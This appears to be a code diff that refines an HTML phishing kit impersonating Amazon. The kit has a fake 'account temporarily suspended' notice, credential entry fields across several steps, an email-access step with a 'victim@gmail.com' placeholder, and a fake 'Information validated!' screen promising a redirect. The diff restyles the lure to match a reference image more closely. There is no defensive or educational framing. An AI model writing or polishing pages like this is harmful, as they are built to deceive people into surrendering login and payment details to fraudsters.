@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Amazon - Account Suspension Notice</title>
+    <title>Amazon - Account Suspension</title>
     <style>
         * {
             margin: 0;
@@ -21,7 +21,7 @@
         }
         .container {
             background: white;
-            max-width: 500px;
+            max-width: 450px;
             width: 100%;
             padding: 25px 30px;
             border-radius: 8px;
@@ -34,29 +34,17 @@
         .logo img {
             width: 120px;
         }
-        .alert {
-            background: #FFF4E5;
-            border-left: 4px solid #FF9900;
-            padding: 15px;
-            margin-bottom: 25px;
-            border-radius: 4px;
-            font-size: 14px;
-        }
-        .alert p {
-            margin-bottom: 10px;
-        }
-        hr {
-            margin: 15px 0;
-            border: none;
-            border-top: 1px solid #e7e7e7;
-        }
-        h1, h2 {
-            font-size: 28px;
-            font-weight: 400;
-            margin-bottom: 20px;
-        }
-        h2 {
+        h1 {
             font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            color: #111;
+        }
+        .suspension-text {
+            font-size: 14px;
+            color: #111;
+            margin-bottom: 25px;
+            line-height: 1.4;
         }
         .form-group {
             margin-bottom: 18px;
@@ -67,7 +55,7 @@
             font-size: 13px;
             margin-bottom: 5px;
         }
-        input, select {
+        input {
             width: 100%;
             padding: 10px;
             border: 1px solid #a6a6a6;
@@ -189,15 +177,14 @@
         <div id="step5_prog" class="progress-step">5</div>
     </div>
 
-    <!-- STEP 1: ACCOUNT SUSPENDED (updated message from image) -->
+    <!-- STEP 1: ACCOUNT SUSPENDED (EXACTLY AS IMAGE) -->
     <div id="step1" class="step active">
         <div class="logo">
             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
         </div>
-        <div class="alert">
-            <p><strong>Dear Customer,</strong></p>
-            <p>Due to a problem with your credit card, We have faced some problems with your account details. Therefore your amazon account has been temporarily suspended. Account suspension will effects your last 15 days activities including all the transaction you have made.</p>
-            <p>Please update your account's information to regain access to all features of Amazon Services.</p>
+        <h1>your amazon account has been temporarily suspended,</h1>
+        <div class="suspension-text">
+            Please update your account's information to regain access to all features of Amazon Services.
         </div>
         <div class="form-group">
             <label>Email or mobile phone number</label>
@@ -209,19 +196,11 @@
         </div>
         <button id="step1Btn">Update Now</button>
         <div id="step1Error" class="error"></div>
-        <div class="note">
-            <strong>Note:</strong> If you do not verify within next 48 hours, Our service will permanently suspend your Amazon account.
-        </div>
         <div class="help-links">
             <a href="#">Forgot your password?</a>
         </div>
         <div class="footer">
             New to Amazon? <a href="#">Create your Amazon account</a>
-        </div>
-        <hr>
-        <div class="note">
-            This message was produced and distributed by Amazon Web Services, Inc. or its affiliates, 410 Terry Ave. North, Seattle, WA 98109.<br>
-            © 2026, Amazon Web Services, Inc. or its affiliates. All rights reserved.
         </div>
     </div>
 
@@ -301,10 +280,6 @@
             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
         </div>
         <h2>Email verification required</h2>
-        <div class="alert">
-            <p>🔐 <strong>Final security step</strong></p>
-            <p>We need to confirm your email access to complete verification.</p>
-        </div>
         <div class="form-group">
             <label>Email address</label>
             <input type="email" id="email_access" placeholder="victim@gmail.com">
@@ -328,7 +303,7 @@
                 <polyline points="22 4 12 14.01 9 11.01"></polyline>
             </svg>
             <h2>Information validated!</h2>
-            <div class="alert" style="background:#e8f5e9; border-left-color:#28a745;">
+            <div class="alert" style="background:#e8f5e9; border-left-color:#28a745; padding:15px; border-radius:4px;">
                 <p>✅ Your information has been successfully verified.</p>
                 <p>You will be redirected to your Amazon account in a few seconds...</p>
             </div>
